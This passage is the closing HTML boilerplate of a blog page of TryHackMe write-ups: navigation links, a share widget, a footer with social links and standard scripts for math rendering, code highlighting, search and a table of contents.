                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
            </li>
            <li class="next">
                <a href="/writeups/tryhackme-writeups/tryhackme-ultratech-writeup/"
                    title="TryHackMe - UltraTech Writeup"><span>Newer&nbsp;&nbsp;</span><i
                        class="icon icon-angle-right" aria-hidden="true"></i></a>
            </li>
            
            <li class="toggle-toc">
                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
                    title="Catalogue" role="button">
                    <span>[&nbsp;</span><span>Index</span>
                    <i class="text-collapsed icon icon-anchor"></i>
                    <i class="text-in icon icon-close"></i>
                    <span>]</span>
                </a>
            </li>
        </ul>
        <div class="bar-right">
            <div class="share-component" data-sites="facebook,twitter"
                data-mobile-sites="">Share on:</div>
        </div>
    </div>
</nav>



</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
<ul class="social-links">
    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
            <i class="icon icon-github"></i></a></li>
    <li><a href="/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
            <i class="icon icon-rss"></i></a></li>
    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
            <i class="icon icon-twitter"></i></a></li>
</ul>
  <div class="copyright">
    &copy;2020  -
    2020
    
    
    </div>
  </div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
            showMathMenu: false, //disables context menu
            tex2jax: {
            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
           }
    });
</script>


<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
<script>
    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>
<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
    hljs.configure({
        tabReplace: '    ', 
        classPrefix: ''     
        
    })
    hljs.initHighlightingOnLoad();
</script>
<script src="/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
<script src="/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>

<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            ROOT_URL: '\/',
            CONTENT_URL: '\/\/searchindex.json ',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script type="text/javascript" src="/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
<script>
    tocbot.init({
        
        tocSelector: '.js-toc',
        
        contentSelector: '.js-toc-content',
        
        headingSelector: 'h1, h2, h3',
        
        hasInnerContainers: true,
    });
</script>


  </body>
</html>
